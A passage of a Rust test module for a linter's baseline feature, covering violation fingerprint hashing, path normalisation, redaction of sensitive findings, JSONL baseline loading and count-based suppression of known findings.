use super::*;

#[test]
fn fingerprint_content_reads_each_file_once_and_only_files() {
    let root = tempfile::tempdir().unwrap();
    std::fs::write(root.path().join("a.txt"), "line\n").unwrap();
    std::fs::create_dir(root.path().join("dir")).unwrap();
    let mut cache = std::collections::HashMap::new();
    let on_line = |path: &str| {
        Violation::new("x")
            .with_path(Path::new(path))
            .with_location(1, 1)
    };
    let file = on_line("a.txt");
    assert_eq!(
        fingerprint_content(root.path(), &file, &mut cache),
        Some(&b"line\n"[..])
    );
    // Cached: a second finding on the file reuses the first read.
    std::fs::write(root.path().join("a.txt"), "changed\n").unwrap();
    assert_eq!(
        fingerprint_content(root.path(), &file, &mut cache),
        Some(&b"line\n"[..])
    );
    for path in ["dir", "missing.txt"] {
        assert_eq!(
            fingerprint_content(root.path(), &on_line(path), &mut cache),
            None
        );
    }
    assert_eq!(
        fingerprint_content(root.path(), &Violation::new("x"), &mut cache),
        None
    );
    // A fingerprint that leaves the content out does not read the file: a
    // sensitive finding, one with a `baseline_key`, and one without a line.
    std::fs::write(root.path().join("b.txt"), "secret\n").unwrap();
    let mut sensitive = on_line("b.txt");
    sensitive.mark_sensitive("test");
    let mut keyed = on_line("b.txt");
    keyed.baseline_key = Some("key".into());
    let lineless = Violation::new("x").with_path(Path::new("b.txt"));
    for v in [sensitive, keyed, lineless] {
        assert_eq!(fingerprint_content(root.path(), &v, &mut cache), None);
        assert!(!cache.contains_key(Path::new("b.txt")));
    }
}

#[test]
fn walk_exclude_leaves_out_only_the_baseline() {
    let root = tempfile::Builder::new()
        .prefix("alint-baseline-test-")
        .tempdir()
        .unwrap();
    let mut names = vec!["base[1].json", "base1.json", "sub/base[1].json"];
    if cfg!(unix) {
        // Legal names only off Windows.
        names.extend(["b*.json", "a\\b.json", "a/b.json", "trailing ", "trailing"]);
    }
    for name in &names {
        let path = root.path().join(name);
        std::fs::create_dir_all(path.parent().unwrap()).unwrap();
        std::fs::write(path, "{}").unwrap();
    }
    let walked = |baseline: &str| {
        let pattern = walk_exclude(root.path(), &root.path().join(baseline)).unwrap();
        let opts = crate::WalkOptions {
            respect_gitignore: false,
            extra_ignores: vec![pattern],
            global_git_excludes: false,
        };
        let index = crate::walker::walk(root.path(), &opts).unwrap();
        let mut left_out: Vec<&str> = names
            .iter()
            .copied()
            .filter(|name| !index.contains_file(Path::new(name)))
            .collect();
        left_out.sort_unstable();
        left_out
    };
    assert_eq!(walked("base[1].json"), ["base[1].json"]);
    if cfg!(unix) {
        assert_eq!(walked("b*.json"), ["b*.json"]);
        assert_eq!(walked("a\\b.json"), ["a\\b.json"]);
        assert_eq!(walked("trailing "), ["trailing "]);
    }
    assert_eq!(
        walk_exclude(root.path(), &root.path().join("missing.json")),
        None
    );
    let outside = tempfile::NamedTempFile::new_in(root.path().parent().unwrap()).unwrap();
    assert_eq!(walk_exclude(root.path(), outside.path()), None);
}

fn fp(
    rule: &str,
    path: Option<&str>,
    line: Option<usize>,
    key: Option<&str>,
    msg: &str,
    bytes: Option<&[u8]>,
) -> String {
    violation_fingerprint(rule, path.map(Path::new), line, key, msg, bytes)
}

#[test]
fn fingerprint_of_an_ordinary_path_is_pinned() {
    // Compatibility pin: existing `.alint-baseline` files hold these exact
    // digests, so a change to path normalization must not move them (audit
    // 2026-10 finding 10 changed only the backslash case below).
    assert_eq!(
        fp("r", Some("src/a.rs"), None, None, "m", None),
        "e442d61e4daffddbab1d9ef55e55aef8974c9cf2983570b0cbbf6e8b869c1817"
    );
    assert_eq!(
        fp(
            "r",
            Some("src/a.rs"),
            Some(2),
            None,
            "m",
            Some(b"x\nbad\ny")
        ),
        "232ea2d0041a143141b5bf4abadf6334080156e142cca88872c37497635b3dd4"
    );
}

#[test]
fn backslash_is_a_separator_only_on_windows() {
    // Audit 2026-10 finding 10: `\` was rewritten to `/` on every OS, so on
    // unix (where `\` is a legal filename byte) `a\b.txt` and the different
    // file `a/b.txt` shared one fingerprint -- a baseline entry for one
    // grandfathered the other, and the fix merge conflated them.
    let slash = fp("r", Some("a/b.txt"), None, None, "m", None);
    let back = fp("r", Some("a\\b.txt"), None, None, "m", None);
    if cfg!(windows) {
        assert_eq!(slash, back, "on Windows `\\` IS the separator");
    } else {
        assert_ne!(slash, back, "on unix `a\\b.txt` is a different file");
    }
}

#[cfg(unix)]
#[test]
fn distinct_non_utf8_paths_have_distinct_fingerprints() {
    use std::os::unix::ffi::OsStringExt as _;

    let first = std::path::PathBuf::from(std::ffi::OsString::from_vec(vec![
        b'a', b'/', 0x80, b'.', b'r', b's',
    ]));
    let second = std::path::PathBuf::from(std::ffi::OsString::from_vec(vec![
        b'a', b'/', 0x81, b'.', b'r', b's',
    ]));
    assert_eq!(first.to_string_lossy(), second.to_string_lossy());
    assert_ne!(
        violation_fingerprint("r", Some(&first), None, None, "m", None),
        violation_fingerprint("r", Some(&second), None, None, "m", None),
        "lossy path rendering must not merge distinct Unix filenames"
    );
}

#[test]
fn fingerprint_is_stable_and_64_hex() {
    let a = fp("r", Some("a.rs"), Some(2), None, "m", Some(b"x\nbad\ny"));
    let b = fp("r", Some("a.rs"), Some(2), None, "m", Some(b"x\nbad\ny"));
    assert_eq!(a, b);
    assert_eq!(a.len(), 64);
    assert!(a.bytes().all(|c| c.is_ascii_hexdigit()));
}

#[test]
fn line_number_is_excluded_only_content_matters() {
    // Same offending content, different line position → same hash.
    let high = fp("r", Some("a.rs"), Some(2), None, "m", Some(b"x\nbad\n"));
    let low = fp(
        "r",
        Some("a.rs"),
        Some(4),
        None,
        "m",
        Some(b"q\nw\ne\nbad\n"),
    );
    assert_eq!(high, low);
}

#[test]
fn crlf_and_lf_offending_lines_match() {
    let lf = fp("r", Some("a.rs"), Some(1), None, "m", Some(b"bad\nrest"));
    let crlf = fp("r", Some("a.rs"), Some(1), None, "m", Some(b"bad\r\nrest"));
    assert_eq!(lf, crlf, "trailing \\r must be stripped from the content");
}

#[test]
fn editing_the_offending_line_changes_the_hash() {
    let before = fp("r", Some("a.rs"), Some(1), None, "m", Some(b"bad\n"));
    let after = fp("r", Some("a.rs"), Some(1), None, "m", Some(b"worse\n"));
    assert_ne!(before, after);
}

#[test]
fn baseline_key_takes_precedence_over_content() {
    // Same key, different file content → same hash (key wins).
    let a = fp(
        "r",
        Some("a.rs"),
        Some(1),
        Some("$.license"),
        "m",
        Some(b"aaa\n"),
    );
    let b = fp(
        "r",
        Some("a.rs"),
        Some(1),
        Some("$.license"),
        "m",
        Some(b"bbb\n"),
    );
    assert_eq!(a, b);
    // Different key → different hash.
    let c = fp(
        "r",
        Some("a.rs"),
        Some(1),
        Some("$.private"),
        "m",
        Some(b"aaa\n"),
    );
    assert_ne!(a, c);
}

#[test]
fn path_shape_default_ignores_message() {
    // v3: a path-bearing, key-less, line-less violation's identity is
    // (rule_id, path); the (volatile) message is NOT hashed. Two
    // different messages on the same path → the SAME fingerprint.
    let a = fp(
        "r",
        Some("a.rs"),
        None,
        None,
        "has 320 lines (max 300)",
        None,
    );
    let b = fp(
        "r",
        Some("a.rs"),
        None,
        None,
        "has 999 lines (max 300)",
        None,
    );
    assert_eq!(a, b, "message must not affect a path-only fingerprint");
    // A different path → a different fingerprint.
    let c = fp(
        "r",
        Some("b.rs"),
        None,
        None,
        "has 320 lines (max 300)",
        None,
    );
    assert_ne!(a, c);
}

#[test]
fn message_fallback_only_when_no_path() {
    // The message is the discriminator ONLY for a no-path, no-line,
    // no-key violation (the anti-panic branch).
    let a = fp("r", None, None, None, "multiple lockfiles", None);
    let b = fp("r", None, None, None, "multiple lockfiles", None);
    let c = fp("r", None, None, None, "something else", None);
    assert_eq!(a, b);
    assert_ne!(a, c, "no-path violations still distinguish by message");
}

#[test]
fn length_prefix_prevents_concatenation_collisions() {
    // ("ab","c") vs ("a","bc") must not collide via the join.
    let x = fp("ab", Some("c"), None, None, "m", None);
    let y = fp("a", Some("bc"), None, None, "m", None);
    assert_ne!(x, y);
    // Same for baseline_key components: {"a b"} vs {"a","b"}-joined.
    let p = fp("r", None, None, Some("a b"), "m", None);
    let q = fp("r", None, None, Some("a"), "b", None); // "b" is the message, unused since key set
    assert_ne!(p, q);
}

#[test]
fn paths_normalize_to_forward_slashes() {
    let unix = violation_fingerprint("r", Some(Path::new("a/b.rs")), None, None, "m", None);
    // On Windows a backslash path hashes the same as its forward-slash form
    // (so a baseline is portable across OSes); on unix `\` is a filename
    // byte, so it must NOT fold (see `backslash_is_a_separator_only_on_windows`).
    let win = violation_fingerprint("r", Some(Path::new("a\\b.rs")), None, None, "m", None);
    assert_eq!(unix == win, cfg!(windows));
}

#[test]
fn missing_line_falls_through_to_path_identity() {
    // line points past EOF → no content → path identity (v3), no panic.
    let a = fp(
        "r",
        Some("a.rs"),
        Some(99),
        None,
        "msg",
        Some(b"only\none\n"),
    );
    let b = fp("r", Some("a.rs"), None, None, "msg", None);
    assert_eq!(a, b);
    // The message is irrelevant in this branch (path identity wins).
    let c = fp(
        "r",
        Some("a.rs"),
        Some(99),
        None,
        "different message",
        Some(b"only\none\n"),
    );
    assert_eq!(a, c);
}

#[test]
fn ranges_related_locations_and_fix_keys_do_not_change_existing_fingerprints() {
    let original = Violation::new("bad")
        .with_path(Path::new("a.rs"))
        .with_location(2, 1);
    let enriched = original
        .clone()
        .with_range(crate::SourceRange::new(3, 1, 3, 2).unwrap())
        .with_related_location(crate::RelatedLocation::new("b.rs", "secondary"))
        .with_fix_key("occurrence\0one");

    assert_eq!(
        fingerprint("rule", &original, Some(b"ok\nbad\nmore\n")),
        fingerprint("rule", &enriched, Some(b"ok\nbad\nmore\n"))
    );
}

#[test]
fn adding_a_range_to_path_only_finding_preserves_path_identity() {
    let original = Violation::new("bad").with_path(Path::new("a.rs"));
    let enriched = original
        .clone()
        .with_range(crate::SourceRange::new(2, 1, 2, 2).unwrap());
    assert_eq!(
        fingerprint("rule", &original, Some(b"ok\nbad\n")),
        fingerprint("rule", &enriched, Some(b"ok\nbad\n"))
    );
}

#[test]
fn sensitive_fingerprint_ignores_message_key_and_file_bytes() {
    let make = |message: &str, key: &str, line: usize| {
        let mut violation = Violation::new(message.to_string())
            .with_path(std::path::PathBuf::from("secrets.env"))
            .with_location(line, 1)
            .with_baseline_key(key.to_string());
        violation.redact_message("rule");
        violation
    };
    let first = make("TOKEN_VALUE_DO_NOT_REPORT", "raw-key-one", 1);
    let second = make("different secret", "raw-key-two", 2);
    assert_eq!(
        fingerprint("rule", &first, Some(b"TOKEN_VALUE_DO_NOT_REPORT\nother\n")),
        fingerprint("rule", &second, Some(b"other\ndifferent secret\n")),
    );
}

/// A finding whose path alint hides, as the engine leaves it.
fn hidden(path: &str) -> Violation {
    let mut violation = Violation::new("m".to_string())
        .with_path(std::path::PathBuf::from(path))
        .with_location(1, 1);
    violation.mark_path_sensitive();
    violation.redact_message("rule");
    violation
}

#[test]
fn a_hidden_path_stays_out_of_the_fingerprint() {
    let (one, two) = (hidden("secret-one.txt"), hidden("dir/secret-two.txt"));
    let current = fingerprint("rule", &one, Some(b"x\n"));
    // Pinned: v0.22 baseline files hold this digest.
    assert_eq!(
        current,
        "61312ccbd0108b3d383c3d2eaadf02298387d8d9f8801aecb7534d21a78dbb19"
    );
    assert_eq!(fingerprint("rule", &two, None), current);
    assert_ne!(fingerprint("other", &one, None), current, "the rule counts");
    // A redacted finding in a file that is really named `hidden-path`.
    let mut named = Violation::new("m".to_string()).with_path(Path::new("hidden-path"));
    named.redact_message("rule");
    assert_ne!(fingerprint("rule", &named, None), current);

    // The engine's run-local key keeps the path.
    assert_ne!(
        path_identity_fingerprint("rule", &one, None),
        path_identity_fingerprint("rule", &two, None)
    );
}

/// A finding identified by its key alone, as the `constraint` kind makes
/// one.
fn path_free(path: &str, key: &str) -> Violation {
    Violation::new(format!("m at {path}"))
        .with_path(Path::new(path))
        .with_location(3, 1)
        .with_baseline_key(key.to_string())
        .with_path_free_identity()
}

#[test]
fn a_path_free_finding_hashes_its_rule_and_key_alone() {
    let first = path_free("packages/a/package.json", "6:unique");
    let current = fingerprint("rule", &first, Some(b"a\nb\nc\n"));
    // Pinned: the form the design writes,
    // sha256(lp(rule_id) || lp("\0constraint") || lp(baseline_key)).
    assert_eq!(
        current,
        hash_components([b"rule", b"\0constraint", b"6:unique"])
    );
    // Another path, line and message: the same finding.
    assert_eq!(
        fingerprint("rule", &path_free("b/package.json", "6:unique"), None),
        current
    );
    assert_ne!(
        fingerprint("rule", &path_free("a", "6:unique1:x"), None),
        current
    );
    assert_ne!(fingerprint("other", &first, None), current);
    // Without the flag the path counts, as for every other kind.
    let flagless = Violation::new("m")
        .with_path(Path::new("packages/a/package.json"))
        .with_baseline_key("6:unique");
    assert_eq!(
        fingerprint("rule", &flagless, None),
        fp(
            "rule",
            Some("packages/a/package.json"),
            None,
            Some("6:unique"),
            "",
            None
        )
    );
    assert_ne!(fingerprint("rule", &flagless, None), current);
    // A sensitive one hashes no key; a hidden path still wins.
    let mut sensitive = path_free("a", "6:unique");
    sensitive.redact_message("rule");
    assert_eq!(
        fingerprint("rule", &sensitive, None),
        hash_components([b"rule", b"\0constraint", b"sensitive"])
    );
    let mut hidden = path_free("a", "6:unique");
    hidden.mark_path_sensitive();
    assert_eq!(
        fingerprint("rule", &hidden, None),
        hash_components([b"rule", HIDDEN_PATH, b"sensitive"])
    );
    // The content of the file it sits in is never read for it.
    let mut cache = std::collections::HashMap::new();
    let mut keyless = Violation::new("m")
        .with_path(Path::new("a"))
        .with_location(1, 1)
        .with_path_free_identity();
    keyless.baseline_key = None;
    assert!(fingerprint_content(Path::new("."), &keyless, &mut cache).is_none());
    assert!(cache.is_empty());
}

fn item(rule: &str, path: Option<&str>, fp: &str) -> FingerprintedViolation {
    FingerprintedViolation {
        rule_id: rule.into(),
        path: path.map(str::to_string),
        fingerprint: fp.into(),
        message: Some("m".into()),
        path_free_identity: false,
    }
}

#[test]
fn aggregate_collapses_identical_fingerprints_into_counts() {
    let b = Baseline::from_fingerprints(
        None,
        vec![
            item("r", Some("a.rs"), "ff"),
            item("r", Some("a.rs"), "ff"),
            item("r", Some("a.rs"), "ff"),
            item("r", Some("b.rs"), "aa"),
        ],
    );
    assert_eq!(b.entries.len(), 2);
    let ff = b.entries.iter().find(|e| e.fingerprint == "ff").unwrap();
    assert_eq!(ff.count, 3);
    assert_eq!(b.total(), 4);
}

#[test]
fn jsonl_round_trips_and_is_deterministic() {
    let b = Baseline::from_fingerprints(
        Some("0.13.0".into()),
        vec![
            item("z-rule", Some("z.rs"), "fff"),
            item("a-rule", None, "aaa"),
            item("a-rule", None, "aaa"),
        ],
    );
    let text = b.to_jsonl();
    // Header first, then one entry per line.
    assert!(
        text.lines()
            .next()
            .unwrap()
            .contains("\"schema_version\":1")
    );
    let parsed = Baseline::load(&text).unwrap();
    assert_eq!(parsed, b);
    // Byte-identical re-serialization (deterministic sort).
    assert_eq!(parsed.to_jsonl(), text);
    // Sorted by rule_id: a-rule before z-rule.
    assert_eq!(parsed.entries[0].rule_id, "a-rule");
    assert_eq!(parsed.entries[0].count, 2);
}

#[test]
fn load_rejects_unsupported_schema_version() {
    let text = "{\"schema_version\":999}\n";
    match Baseline::load(text) {
        Err(BaselineError::UnsupportedSchema { found: 999 }) => {}
        other => panic!("expected UnsupportedSchema, got {other:?}"),
    }
}

#[test]
fn load_rejects_empty_and_malformed() {
    assert!(matches!(Baseline::load("   \n"), Err(BaselineError::Empty)));
    assert!(matches!(
        Baseline::load("not json\n"),
        Err(BaselineError::Parse { what: "header", .. })
    ));
    let bad_entry = format!("{{\"schema_version\":{SCHEMA_VERSION}}}\nnope\n");
    assert!(matches!(
        Baseline::load(&bad_entry),
        Err(BaselineError::Parse { what: "entry", .. })
    ));
}

#[test]
fn fingerprint_violation_wrapper_reads_fields_incl_baseline_key() {
    use std::path::Path as P;
    // Wrapper agrees with the decomposed call for a line violation.
    let v = Violation::new("msg")
        .with_path(P::new("a.rs"))
        .with_location(2, 1);
    let bytes = b"x\nbad\ny";
    assert_eq!(
        fingerprint("r", &v, Some(bytes)),
        fp("r", Some("a.rs"), Some(2), None, "msg", Some(bytes))
    );
    // A baseline_key overrides the line content.
    let keyed = Violation::new("msg")
        .with_path(P::new("a.rs"))
        .with_location(2, 1)
        .with_baseline_key("$.license");
    assert_eq!(
        fingerprint("r", &keyed, Some(bytes)),
        fp(
            "r",
            Some("a.rs"),
            Some(2),
            Some("$.license"),
            "msg",
            Some(bytes)
        )
    );
    assert_ne!(
        fingerprint("r", &keyed, Some(bytes)),
        fingerprint("r", &v, Some(bytes))
    );
}

#[test]
fn empty_baseline_is_valid_and_suppresses_nothing() {
    let text = format!("{{\"schema_version\":{SCHEMA_VERSION}}}\n");
    let b = Baseline::load(&text).unwrap();
    assert_eq!(b.entries, Vec::new());
    assert_eq!(b.total(), 0);
}

#[test]
fn load_sums_duplicate_fingerprints() {
    // Two entries with the SAME fingerprint (e.g. a git merge of two
    // baselines that each recorded the finding) must SUM, not
    // last-writer-wins, so the suppression budget is the total.
    let text = format!(
        "{{\"schema_version\":{SCHEMA_VERSION}}}\n\
         {{\"rule_id\":\"r\",\"fingerprint\":\"ff\",\"count\":2}}\n\
         {{\"rule_id\":\"r\",\"fingerprint\":\"ff\",\"count\":3}}\n"
    );
    let b = Baseline::load(&text).unwrap();
    assert_eq!(b.entries.len(), 1, "duplicates collapse to one entry");
    assert_eq!(b.entries[0].count, 5, "counts sum (2 + 3)");
    assert_eq!(b.total(), 5);
}

#[test]
fn from_fingerprints_advisory_message_is_order_independent() {
    // A path-identity group collapses violations whose messages differ;
    // the committed advisory message must not depend on input order.
    let mk = |msg: &str| FingerprintedViolation {
        rule_id: "r".into(),
        path: Some("a.rs".into()),
        fingerprint: "shared".into(),
        message: Some(msg.into()),
        path_free_identity: false,
    };
    let one = Baseline::from_fingerprints(None, vec![mk("zeta"), mk("alpha")]);
    let two = Baseline::from_fingerprints(None, vec![mk("alpha"), mk("zeta")]);
    assert_eq!(one, two, "advisory message must not depend on input order");
    assert_eq!(one.entries.len(), 1);
    assert_eq!(one.entries[0].count, 2);
    assert_eq!(
        one.entries[0].message.as_deref(),
        Some("alpha"),
        "the lexicographically smallest message is pinned"
    );
}

// ─── apply (the suppression transform) ──────────────────────────

use crate::Level;
use crate::report::Report;
use crate::rule::RuleResult;

/// A report with one rule emitting violations `(message, line)`.
fn report(rule: &str, level: Level, vs: &[(&str, Option<usize>)]) -> Report {
    let raw = vs
        .iter()
        .map(|(m, line)| {
            let v = Violation::new((*m).to_string()).with_path(Path::new("f.rs"));
            match line {
                Some(l) => v.with_location(*l, 1),
                None => v,
            }
        })
        .collect();
    Report {
        results: vec![RuleResult::new(
            std::sync::Arc::from(rule),
            level,
            None,
            raw,
            false,
        )],
    }
}

fn entry(fp: &str, count: u32) -> BaselineEntry {
    BaselineEntry {
        rule_id: "r".into(),
        path: None,
        fingerprint: fp.into(),
        count,
        message: None,
        paths: Vec::new(),
    }
}

// Stub fingerprinter: each distinct message is its own fingerprint;
// identical messages collide (the count/tie-break case). Decouples
// the transform test from the hash.
fn by_message(_rule: &str, v: &Violation) -> String {
    v.message.to_string()
}

#[test]
fn apply_matches_hidden_paths_by_count_and_not_by_the_v021_form() {
    let report = |paths: &[&str]| Report {
        results: vec![RuleResult::new(
            std::sync::Arc::from("rule"),
            Level::Error,
            None,
            paths.iter().map(|path| hidden(path)).collect(),
            false,
        )],
    };
    let current = fingerprint("rule", &hidden("a.txt"), None);
    let by_fingerprint = |rule: &str, v: &Violation| fingerprint(rule, v, None);
    let baseline = |entries: Vec<BaselineEntry>| Baseline {
        alint_version: None,
        entries,
    };

    // The shared fingerprint grandfathers as many findings as it counts.
    let shared = baseline(vec![entry(&current, 2)]);
    let out = apply(
        &report(&["a.txt", "b.txt", "c.txt"]),
        &shared,
        by_fingerprint,
    );
    assert_eq!(out.suppressed_total, 2);
    assert_eq!(out.stale, Vec::new());
    assert!(out.suppressed.iter().all(|s| s.fingerprint == current));
    assert_eq!(out.live_fingerprints, [vec![current.clone()]], "one is new");

    // A v0.21 file hashed each path. v0.23 no longer matches that form
    // (ADR-0030 decision 1): its entries are stale and the findings new.
    let v021 = |path: &str| path_identity_fingerprint("rule", &hidden(path), None);
    let old = baseline(vec![entry(&v021("a.txt"), 1), entry(&v021("b.txt"), 1)]);
    let out = apply(&report(&["a.txt", "b.txt"]), &old, by_fingerprint);
    assert_eq!((out.suppressed_total, out.stale.len()), (0, 2));
    assert_eq!(out.live_fingerprints, [vec![current.clone(), current]]);
}

#[test]
fn apply_suppresses_up_to_count_then_reports_new() {
    let rep = report(
        "r",
        Level::Error,
        &[("X", Some(1)), ("X", Some(2)), ("X", Some(3))],
    );
    let base = Baseline {
        alint_version: None,
        entries: vec![entry("X", 2)],
    };
    let out = apply(&rep, &base, by_message);
    assert_eq!(out.suppressed_total, 2);
    assert_eq!(out.live.total_violations(), 1, "the 3rd X is new");
    assert_eq!(out.stale, Vec::new());
}

#[test]
fn apply_reports_unbaselined_as_new() {
    let rep = report("r", Level::Error, &[("Y", Some(1))]);
    let base = Baseline {
        alint_version: None,
        entries: vec![entry("X", 5)],
    };
    let out = apply(&rep, &base, by_message);
    assert_eq!(out.suppressed_total, 0);
    assert_eq!(out.live.total_violations(), 1);
    // X matched nothing → stale with its full count.
    assert_eq!(out.stale.len(), 1);
    assert_eq!(out.stale[0].count, 5);
}

#[test]
fn apply_detects_partial_stale() {
    let rep = report("r", Level::Error, &[("X", Some(1))]);
    let base = Baseline {
        alint_version: None,
        entries: vec![entry("X", 3)],
    };
    let out = apply(&rep, &base, by_message);
    assert_eq!(out.suppressed_total, 1);
    assert_eq!(out.live.total_violations(), 0);
    assert_eq!(out.stale.len(), 1);
    assert_eq!(out.stale[0].count, 2, "unfilled remainder");
}

#[test]
fn apply_tiebreak_is_deterministic_by_line() {
    // Same message (same fp), three lines, baseline count 1.
    let rep = report(
        "r",
        Level::Error,
        &[("X", Some(50)), ("X", Some(1)), ("X", Some(10))],
    );
    let base = Baseline {
        alint_version: None,
        entries: vec![entry("X", 1)],
    };
    let out = apply(&rep, &base, by_message);
    assert_eq!(out.suppressed_total, 1);
    // The lowest-ordered occurrence (line 1) is suppressed; lines
    // 10 and 50 remain live, in sorted order.
    let live_lines: Vec<usize> = out.live.results[0]
        .violations
        .iter()
        .map(|v| v.line.unwrap())
        .collect();
    assert_eq!(live_lines, vec![10, 50]);
    assert_eq!(out.suppressed[0].violation.line, Some(1));
}

#[test]
fn apply_empty_baseline_leaves_everything_live() {
    let rep = report("r", Level::Error, &[("X", Some(1)), ("Y", Some(2))]);
    let out = apply(&rep, &Baseline::default(), by_message);
    assert_eq!(out.suppressed_total, 0);
    assert_eq!(out.live.total_violations(), 2);
    assert_eq!(out.stale, Vec::new());
}

#[test]
fn apply_preserves_notes_without_fingerprinting_or_suppressing_them() {
    let rep = Report {
        results: vec![RuleResult::new(
            "r".into(),
            Level::Error,
            None,
            vec![
                Violation::new("X"),
                Violation::new("bounded detail").as_analysis_truncated_note(),
            ],
            false,
        )],
    };
    let base = Baseline {
        alint_version: None,
        entries: vec![entry("X", 1)],
    };
    let mut fingerprint_calls = 0;
    let out = apply(&rep, &base, |rule, violation| {
        fingerprint_calls += 1;
        by_message(rule, violation)
    });

    assert_eq!(fingerprint_calls, 1, "notes are not baseline candidates");
    assert!(out.live.results[0].violations.is_empty());
    assert_eq!(out.live.total_notes(), 1);
    assert_eq!(
        out.live.results[0].notes[0].note_kind(),
        Some(crate::NoteKind::AnalysisTruncated)
    );
}

#[test]
fn apply_suppressing_all_errors_clears_the_exit_signal() {
    let rep = report("r", Level::Error, &[("X", Some(1))]);
    assert!(rep.has_errors());
    let base = Baseline {
        alint_version: None,
        entries: vec![entry("X", 1)],
    };
    let out = apply(&rep, &base, by_message);
    assert!(
        !out.live.has_errors(),
        "a fully-baselined error report must exit clean"
    );
}

#[test]
fn apply_honors_summed_budget_from_merged_duplicates() {
    // A merged baseline with the same fingerprint twice (2 + 3) must
    // suppress all five occurrences, not just the last writer's three.
    let text = format!(
        "{{\"schema_version\":{SCHEMA_VERSION}}}\n\
         {{\"rule_id\":\"r\",\"fingerprint\":\"X\",\"count\":2}}\n\
         {{\"rule_id\":\"r\",\"fingerprint\":\"X\",\"count\":3}}\n"
    );
    let base = Baseline::load(&text).unwrap();
    let rep = report(
        "r",
        Level::Error,
        &[
            ("X", Some(1)),
            ("X", Some(2)),
            ("X", Some(3)),
            ("X", Some(4)),
            ("X", Some(5)),
        ],
    );
    let out = apply(&rep, &base, by_message);
    assert_eq!(out.suppressed_total, 5, "summed budget suppresses all five");
    assert_eq!(out.live.total_violations(), 0);
    assert_eq!(out.stale, Vec::new());
}

#[test]
fn apply_live_fingerprints_align_with_live_violations() {
    // Two rules, each with one suppressed + one live finding. Every
    // stored live fingerprint must equal recomputing it on the SAME
    // live violation it sits beside — the invariant the SARIF/JSON
    // formatters rely on via positional indexing.
    let lined = |m: &str, l: usize| {
        Violation::new(m.to_string())
            .with_path(Path::new("f.rs"))
            .with_location(l, 1)
    };
    let r1 = RuleResult::new(
        std::sync::Arc::from("r1"),
        Level::Error,
        None,
        vec![lined("A", 1), lined("B", 2)],
        false,
    );
    let r2 = RuleResult::new(
        std::sync::Arc::from("r2"),
        Level::Error,
        None,
        vec![lined("C", 1), lined("D", 2)],
        false,
    );
    let rep = Report {
        results: vec![r1, r2],
    };
    // Baseline A and C (by_message fingerprints) → B and D stay live.
    let base = Baseline {
        alint_version: None,
        entries: vec![entry("A", 1), entry("C", 1)],
    };
    let out = apply(&rep, &base, by_message);
    for (ri, rr) in out.live.results.iter().enumerate() {
        for (vi, v) in rr.violations.iter().enumerate() {
            assert_eq!(
                out.live_fingerprints[ri][vi],
                by_message(&rr.rule_id, v),
                "live_fingerprints[{ri}][{vi}] must match its own violation"
            );
        }
    }
    assert_eq!(out.live.results[0].violations[0].message.as_ref(), "B");
    assert_eq!(out.live.results[1].violations[0].message.as_ref(), "D");
}

#[test]
fn apply_never_fingerprints_or_suppresses_analysis_failures() {
    use crate::AnalysisFailureKind;

    let rep = Report {
        results: vec![RuleResult::new(
            std::sync::Arc::from("r"),
            Level::Warning,
            None,
            vec![
                Violation::new("same").with_path(Path::new("f.rs")),
                Violation::new("same")
                    .with_path(Path::new("f.rs"))
                    .as_analysis_failure(AnalysisFailureKind::ResourceRead),
            ],
            false,
        )],
    };
    let base = Baseline {
        alint_version: None,
        entries: vec![entry("same", 2)],
    };
    let mut fingerprint_calls = 0;
    let out = apply(&rep, &base, |rule, violation| {
        fingerprint_calls += 1;
        by_message(rule, violation)
    });

    assert_eq!(
        fingerprint_calls, 1,
        "only policy violations are fingerprinted"
    );
    assert_eq!(out.suppressed_total, 1);
    assert!(out.live.results[0].violations.is_empty());
    assert_eq!(out.live.results[0].analysis_failures.len(), 1);
    assert!(out.live.has_errors(), "baseline cannot downgrade a failure");
}

#[test]
fn preferred_paths_keep_baselined_repeats_suppressed_when_new_repeat_sorts_first() {
    let mk_v = |path: &str| {
        Violation::new("dup")
            .with_path(Path::new(path))
            .with_baseline_key("dup")
            .with_path_free_identity()
    };
    let fp = fingerprint("names-unique", &mk_v("p14/package.json"), None);
    // Baseline records p14 and p60 (count 2, paths ["p14/...", "p60/..."]).
    let baseline = Baseline::from_fingerprints(
        Some("0.24.0".into()),
        [
            FingerprintedViolation::from_violation(
                "names-unique",
                &mk_v("p60/package.json"),
                fp.clone(),
            ),
            FingerprintedViolation::from_violation(
                "names-unique",
                &mk_v("p14/package.json"),
                fp.clone(),
            ),
        ],
    );
    assert_eq!(baseline.entries.len(), 1);
    assert_eq!(baseline.entries[0].count, 2);
    assert_eq!(
        baseline.entries[0].path.as_deref(),
        Some("p14/package.json"),
        "advisory path is pinned deterministically"
    );
    assert_eq!(
        baseline.entries[0].paths,
        ["p14/package.json", "p60/package.json"]
    );

    // Add p13 (sorts before p14 and p60): p14 and p60 stay suppressed, p13 is live.
    let rep = Report {
        results: vec![RuleResult::new(
            std::sync::Arc::from("names-unique"),
            Level::Error,
            None,
            vec![
                mk_v("p13/package.json"),
                mk_v("p14/package.json"),
                mk_v("p60/package.json"),
            ],
            false,
        )],
    };
    let out = apply(&rep, &baseline, |r, v| fingerprint(r, v, None));
    assert_eq!(out.suppressed_total, 2);
    let supp_paths: Vec<&Path> = out
        .suppressed
        .iter()
        .filter_map(|s| s.violation.path.as_deref())
        .collect();
    assert_eq!(
        supp_paths,
        [Path::new("p14/package.json"), Path::new("p60/package.json")]
    );
    let live_paths: Vec<&Path> = out.live.results[0]
        .violations
        .iter()
        .filter_map(|v| v.path.as_deref())
        .collect();
    assert_eq!(live_paths, [Path::new("p13/package.json")]);

    // Rename fallback (Pass 2): if p60 is renamed to p13 (2 total findings),
    // Pass 1 suppresses p14 and Pass 2 fills the remaining slot with p13.
    let renamed = Report {
        results: vec![RuleResult::new(
            std::sync::Arc::from("names-unique"),
            Level::Error,
            None,
            vec![mk_v("p13/package.json"), mk_v("p14/package.json")],
            false,
        )],
    };
    let out_renamed = apply(&renamed, &baseline, |r, v| fingerprint(r, v, None));
    assert_eq!(out_renamed.suppressed_total, 2);
    assert!(out_renamed.live.results[0].violations.is_empty());
}

#[test]
fn single_count_path_free_entry_preserves_original_when_earlier_repeat_added() {
    let mk_v = |path: &str| {
        Violation::new("dup")
            .with_path(Path::new(path))
            .with_baseline_key("dup")
            .with_path_free_identity()
    };
    let fp = fingerprint("names-unique", &mk_v("p60/package.json"), None);
    let single = Baseline::from_fingerprints(
        Some("0.24.0".into()),
        [FingerprintedViolation::from_violation(
            "names-unique",
            &mk_v("p60/package.json"),
            fp,
        )],
    );
